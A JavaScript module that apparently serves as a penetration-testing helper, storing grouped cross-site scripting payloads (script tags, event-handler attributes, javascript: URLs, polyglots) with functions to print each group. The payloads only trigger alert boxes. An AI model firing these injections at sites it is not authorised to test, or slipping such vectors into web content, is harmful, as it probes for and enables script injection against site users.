const xss = {
    payloads:{
        basic:{
            name:'Basic',
            commands:[
                `<script>alert(1)</script>`,
                `"><script>alert(1)</script>`,
                `<IMG SRC="javascript:alert('XSS')">`,
                `<svg/onload=alert(1)>`,
                `<iframe src="javascript:alert('XSS')">`,
                `<math><mtext></mtext><script>alert(1)</script>`,
                `<video><source onerror="alert(1)"></source>`
            ]
        },
        contextBypass:{
            name:'Context Bypass',
            commands:[
                `"><img src=x onerror=alert(1)>`,
                `" autofocus onfocus=alert(1) x="`,
                `'><svg onload=alert(1)>`,
                `<details open ontoggle=alert(1)>`,
                `<marquee onstart=alert(1)>`,
            ]

        },
        eventHandler:{
            name:'Event Handler',
            commands:[
                `<input onfocus=alert(1) autofocus>`,
                `<svg><a xlink:href="javascript:alert(1)">Click</a></svg>`,
                `<div onmouseover="alert(1)">Hover me</div>`,
                `<math><mi xlink:href="javascript:alert(1)">Test</mi></math>`
            ]
        },
        url:{
            name:'url',
            commands:[
                    `<a href="javascript:alert(1)">Click</a>`,
                    `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
                    `<base href="javascript://%0Aalert(1)//">`,
                    `http://example.com/page#<script>alert(1)</script>`,
                    `http://example.com/page?input=<img src=x onerror=alert(1)>`
                ]
        },
        polyglot:{
            name:'Polyglot',
            commands:[
                    `"><svg/onload=confirm(1)>"</script><img src=x onerror=alert(1)>`,
                    `<iframe srcdoc='<script>alert(1)</script>'>`,
                    `<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>`
                ]
        }
    },
    utils:{
        print:function(groupToPrint){
            const printGroup = this.getGroup(groupToPrint)
            if(printGroup){  
                console.log(printGroup.name)  
                for (let i = 0; i < printGroup.commands.length; i++) {
                    console.log(printGroup.commands[i]);
                }
            }
            else{
                console.log('Error invalid selection')
            }
        },
        getGroup:function(groupName){  
            const group = xss.payloads && xss.payloads[groupName];
            if (group && Array.isArray(group.commands)) {
                return group;
            }
            else{
                return false
            }
        }
    }
}

module.exports = xss;
